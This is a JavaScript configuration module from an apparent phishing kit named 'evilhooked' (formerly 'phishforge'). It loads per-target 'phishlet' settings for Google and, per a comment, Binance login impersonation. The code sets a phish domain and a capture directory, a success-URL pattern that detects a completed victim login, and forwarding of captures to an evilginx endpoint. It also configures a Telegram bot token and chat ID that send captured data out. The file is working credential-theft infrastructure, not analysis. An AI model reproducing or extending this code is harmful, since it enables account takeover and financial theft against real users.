import { readFileSync, writeFileSync, existsSync } from 'fs';
import { resolve, join, dirname, isAbsolute } from 'path';
import { fileURLToPath } from 'url';
import { setTelegramConfig } from './telegram.js';

const __dirname = dirname(fileURLToPath(import.meta.url));
export const ROOT = process.env.EVILHOOKED_ROOT || process.env.PHISHFORGE_ROOT || resolve(__dirname, '..', '..');
export const KIT_DIR = 'evilhooked';

export const PUPPET_REGISTRY_FILE = join(ROOT, KIT_DIR, 'puppet-registry.json');
export const DEFAULT_PUPPET_CONFIG = join(ROOT, KIT_DIR, 'puppet-google.json');

/** Resolve path against project root; stale absolute paths fall back to defaultRel. */
function resolveFromRoot(p, defaultRel = '') {
  let v = p || defaultRel;
  if (!v) return '';
  if (typeof v === 'string' && v.startsWith('.phishforge')) {
    v = KIT_DIR + v.slice('.phishforge'.length);
  }
  if (isAbsolute(v)) {
    if (existsSync(v)) return v;
    v = defaultRel;
    if (!v) return p;
  }
  return resolve(ROOT, v);
}

export function loadPuppetConfig(configPath) {
  const rawPath = configPath || process.env.EVILHOOKED_PUPPET_CONFIG || process.env.PHISHFORGE_PUPPET_CONFIG || DEFAULT_PUPPET_CONFIG;
  const p = resolveFromRoot(rawPath, `${KIT_DIR}/puppet-google.json`);
  if (!p || !existsSync(p)) {
    throw new Error(`Puppet config not found: ${p || '(set EVILHOOKED_PUPPET_CONFIG)'} (root=${ROOT})`);
  }
  let text = readFileSync(p, 'utf8');
  if (text.charCodeAt(0) === 0xfeff) text = text.slice(1);
  const raw = JSON.parse(text);
  const cfg = normalizePuppetConfig(raw);
  setTelegramConfig(cfg.telegram || raw.telegram || {});
  return cfg;
}

function normalizePuppetConfig(raw) {
  return {
    phishletName: raw.phishletName || 'phishlet',
    phishDomain: raw.phishDomain || 'evil.local',
    loginHost: raw.loginHost || 'accounts.google.com',
    loginPath: raw.loginPath || '/',
    targetUrl: raw.targetUrl || `https://${raw.loginHost || 'accounts.google.com'}${raw.loginPath || '/'}`,
    port: Number(raw.port) || 1000,
    host: raw.host || '127.0.0.1',
    captureDir: resolveFromRoot(raw.captureDir, `${KIT_DIR}/captures`),
    chromeProfileDir: resolveFromRoot(raw.chromeProfileDir, `${KIT_DIR}/chrome-profile-cdp`),
    cdpUrl: raw.cdpUrl || 'http://127.0.0.1:9222',
    headless: raw.headless !== false,
    background: raw.background !== false,
    minimizeWindow: raw.minimizeWindow !== false,
    upstreamMode: raw.upstreamMode || 'direct',
    channel: raw.channel || 'chrome',
    locale: raw.locale || 'en-US',
    timezoneId: raw.timezoneId || 'Europe/London',
    acceptLanguage: raw.acceptLanguage || 'en-US,en;q=0.9',
    viewport: raw.viewport || { width: 1366, height: 768 },
    hostMap: raw.hostMap || {},
    playwrightProxy: raw.playwrightProxy || null,
    successUrlPattern: raw.successUrlPattern || 'myaccount.google.com|ManageAccount|CheckCookie|www\\.google\\.',
    redirectAfterCapture: raw.redirectAfterCapture || 'https://www.google.com',
    evilginxCaptureUrl: raw.evilginxCaptureUrl || 'http://127.0.0.1:9092/puppet/capture',
    mode: raw.mode || 'assist',
    telegram: {
      enabled: raw.telegram?.enabled !== false,
      botToken: raw.telegram?.botToken || raw.telegram?.bot_token || raw.telegram?.teletoken || '',
      chatId: raw.telegram?.chatId || raw.telegram?.chat_id || raw.telegram?.chatid || '',
    },
  };
}

export function loadPuppetRegistry() {
  const path = process.env.EVILHOOKED_PUPPET_REGISTRY || process.env.PHISHFORGE_PUPPET_REGISTRY || PUPPET_REGISTRY_FILE;
  if (!existsSync(path)) return { defaultPhishlet: 'google', phishlets: {} };
  try {
    const raw = JSON.parse(readFileSync(path, 'utf8'));
    return {
      defaultPhishlet: raw.defaultPhishlet || 'google',
      phishlets: raw.phishlets || {},
    };
  } catch {
    return { defaultPhishlet: 'google', phishlets: {} };
  }
}

/** Resolve phishlet name from victim hostname (fallback when X-Phishlet-Name missing). */
export function resolvePhishletFromHost(phishHost) {
  if (!phishHost) return '';
  const host = phishHost.toLowerCase();
  const registry = loadPuppetRegistry();
  for (const [name, configPath] of Object.entries(registry.phishlets || {})) {
    if (!configPath || !existsSync(configPath)) continue;
    try {
      const raw = JSON.parse(readFileSync(configPath, 'utf8'));
      const domain = (raw.phishDomain || '').toLowerCase();
      if (domain && (host === domain || host.endsWith(`.${domain}`))) return name;
    } catch { /* skip */ }
  }
  return '';
}

/** Resolve per-phishlet config — Google and Binance use separate JSON files. */
export function resolvePuppetConfigForPhishlet(baseConfig, phishletName, phishHost = '') {
  let name = (phishletName || '').trim().toLowerCase();
  if (!name) name = resolvePhishletFromHost(phishHost);
  if (!name) return baseConfig;

  const registry = loadPuppetRegistry();
  const configPath = registry.phishlets?.[name];
  if (!configPath || !existsSync(configPath)) {
    if (baseConfig.phishletName?.toLowerCase() === name) return baseConfig;
    return baseConfig;
  }

  try {
    const cfg = normalizePuppetConfig(JSON.parse(readFileSync(configPath, 'utf8')));
    return cfg;
  } catch {
    return baseConfig;
  }
}

export function writePuppetRegistryEntry(phishletName, configPath, { setDefault = false } = {}) {
  const registry = loadPuppetRegistry();
  registry.phishlets[phishletName] = resolve(configPath);
  if (setDefault) registry.defaultPhishlet = phishletName;
  if (!registry.defaultPhishlet) registry.defaultPhishlet = 'google';
  writeFileSync(PUPPET_REGISTRY_FILE, JSON.stringify(registry, null, 2), 'utf8');
  return registry;
}
